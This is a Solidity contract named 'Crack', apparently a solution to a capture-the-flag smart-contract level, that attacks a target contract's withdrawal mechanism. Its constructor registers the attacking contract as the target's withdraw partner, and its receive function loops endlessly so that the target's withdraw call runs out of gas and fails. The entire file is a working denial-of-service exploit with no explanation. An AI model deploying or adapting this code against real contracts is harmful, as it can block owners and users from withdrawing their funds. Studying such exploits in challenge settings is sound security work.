pragma solidity ^0.6.0;

interface Target {
    function owner() external view returns (address);
    function setWithdrawPartner(address) external;
    function withdraw() external;
}

contract Crack {
    Target target;

    constructor(address _target) public {
        target = Target(_target);
        target.setWithdrawPartner(address(this));
    }
    
    receive() external payable {
        while(true) {   

        }
    }
}